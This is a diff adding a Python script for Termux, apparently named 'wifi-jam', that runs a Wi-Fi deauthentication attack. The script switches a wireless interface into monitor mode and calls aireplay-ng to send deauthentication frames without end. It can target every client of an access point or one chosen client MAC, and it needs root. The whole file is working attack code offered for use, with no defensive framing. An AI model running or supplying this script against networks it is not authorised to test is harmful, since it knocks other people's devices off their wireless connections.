@@ -1,0 +1,112 @@
+#!/data/data/com.termux/files/usr/bin/env python
+##
+##  Deauthenticate client(s) from wifi AP
+##
+
+import os
+import signal
+import sys
+
+from subprocess import call
+
+
+WLAN_IFACE = None
+
+try:
+    WLAN_IFACE = os.environ['IFACE']
+
+    if not WLAN_IFACE:
+        WLAN_IFACE = "wlan1"
+except:
+    WLAN_IFACE = "wlan1"
+
+def print_usage():
+    print("")
+    print("Usage: wifi-jam [AP MAC] (TARGET MAC)")
+    print("")
+    print("Perform deauth attack on target Wi-Fi AP.")
+    print("")
+    print("If target MAC is not set, then broadcast deauth attack")
+    print("will be performed.")
+    print("")
+    print("By default it uses wireless interface 'wlan1', if")
+    print("this is not suitable for you, set environment variable")
+    print("'IFACE' to you interface name.")
+    print("")
+
+def attack():
+    signal.signal(signal.SIGINT, shutdown)
+
+    with open(os.devnull, "w") as mystdout:
+        """ Deactivating interface with ifconfig """
+        print("== Deactivating interface... ", end="")
+
+        ret = call(["/data/data/com.termux/files/usr/bin/ifconfig",
+                    WLAN_IFACE, "down"])
+
+        if ret == 0:
+            print("ok")
+        else:
+            print("fail")
+            print("== Cannot continue !")
+            sys.exit(1)
+
+        """ Enabling monitor mode with iwconfig """
+        print("== Enabling monitor mode... ", end="")
+
+        ret = call(["/data/data/com.termux/files/usr/bin/iwconfig",
+                    WLAN_IFACE, "mode", "monitor"],
+                   stdout=mystdout, stderr=mystdout)
+
+        if ret == 0:
+            print("ok")
+        else:
+            print("fail")
+            print("== Cannot continue !")
+            sys.exit(1)
+
+        """ Activating interface with ifconfig """
+        print("== Activating interface... ", end="")
+
+        ret = call(["/data/data/com.termux/files/usr/bin/ifconfig",
+                    WLAN_IFACE, "up"])
+
+        if ret == 0:
+            print("ok")
+        else:
+            print("fail")
+            print("== Cannot continue !")
+            sys.exit(1)
+
+    if len(sys.argv) == 2:
+        """ Broadcast deauth """
+        call(["/data/data/com.termux/files/usr/bin/aireplay-ng",
+              "-0", "0",
+              "-a", sys.argv[1],
+              "-c", "ff:ff:ff:ff:ff:ff",
+              WLAN_IFACE])
+    elif len(sys.argv) > 2:
+        """ Targeted deauth """
+        call(["/data/data/com.termux/files/usr/bin/aireplay-ng",
+              "-0", "0",
+              "-a", sys.argv[1],
+              "-c", sys.argv[2],
+              WLAN_IFACE])
+    else:
+        print_usage()
+        sys.exit(1)
+
+def shutdown(signal, frame):
+    """ Exiting with status 0 """
+    sys.exit(0)
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print_usage()
+        sys.exit(0)
+
+    if os.getuid() != 0:
+        print("[!] Only superuser can do this.")
+        sys.exit(1)
+    else:
+        attack()
